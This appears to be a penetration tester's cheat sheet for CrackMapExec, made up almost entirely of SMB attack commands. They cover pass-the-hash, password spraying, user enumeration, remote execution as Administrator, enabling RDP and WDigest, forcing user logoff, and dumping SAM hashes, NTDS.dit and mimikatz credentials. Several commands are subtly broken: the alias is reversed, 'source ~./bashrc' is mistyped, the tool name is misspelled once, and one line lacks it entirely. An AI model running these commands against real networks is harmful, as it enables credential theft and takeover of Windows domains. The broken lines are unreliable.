First and foremost. I don't like the word crackmapexec showing up on client reports. Its scared some in the past. I guess the word 'crack' made them think I was using cracked/pirated software ¯\\_(ツ)_/¯

```bash
## Add an alias for crackmapexec
nano ~/.bashrc

## copy and paste under '#My aliases'
alias crackmapexec='cme'

## Save and load your bashrc file
source ~./bashrc
```

## Cheatsheet
```bash
## General help
crackmapexec --help
## Protocol help
cracmapexec smb --help
```

### Find Null session
```bash
cme smb 0.0.0.0/24 -u '' -p ''
```

### Connect to target using local account
```bash
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASSWORD' --local-auth
```

### Pass the hash against a subnet
```bash
crackmapexec smb 0.0.0.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 0.0.0.0/24 -u administrator -H 'NTHASH'
```

### Bruteforcing and Password Spraying
```bash
crackmapexec smb 0.0.0.0/24 -u "admin" -p "password1"
crackmapexec smb 0.0.0.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 0.0.0.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 0.0.0.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 0.0.0.0/24 -u user_file.txt -H ntlm_hashFile.txt
```

### User Enumeration
```bash
# Enumerate users
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASS' --rid-brute

# Enumerate domain groups
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASS' --local-users
```

## Host Enumeration
```bash
# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb 0.0.0.0/24 --gen-relay-list output.txt

# Enumerate available shares
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 0.0.0.0 -u 'user' -p 'PASS' --pass-pol
```

## Execution and Control 
```bash
# CrackMapExec has 3 different command execution methods (in default order) :
# - wmiexec --> WMI
# - atexec --> scheduled task
# - smbexec --> creating and running a service

# Execute command through cmd.exe (admin privileges required)
crackmapexec smb 0.0.0.0 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# Force the smbexec method
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

# Execute commands through PowerShell (admin privileges required)
crackmapexec smb 0.0.0.0 -u Administrator -p 'P@ssw0rd' -X 'whoami'
```

## Enable RDP
```bash
sudo crackmapexec smb 0.0.0.0 -u user -p password -M rdp -o ACTION=enable
```

## Dumping Credentials
```bash
# Dump local SAM hashes
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' --local-auth --sam
```

```bash
# Enable or disable WDigest to get credentials from the LSA Memory
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable

# Then you juste have to wait the user logoff and logon again
# But you can force the logoff
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' -x 'quser'
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'
```

```bash
# Dump the NTDS.dit from DC using methods from secretsdump.py

# Uses drsuapi RPC interface create a handle, trigger replication
# and combined with additional drsuapi calls to convert the resultant 
# linked-lists into readable format
crackmapexec smb 0.0.0.0 -u UserNAme -p 'PASSWORDHERE' --ntds

# Uses the Volume Shadow copy Service
crackmapexec smb 0.0.0.0 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# Dump the NTDS.dit password history
smb 0.0.0.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

## Modules
```bash
# List available modules
crackmapexec smb -L

# Module information
crackmapexec smb -M mimikatz --module-info

# View module options
crackmapexec smb -M mimikatz --options

# Mimikatz module
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 0.0.0.0 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 0.0.0.0 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```
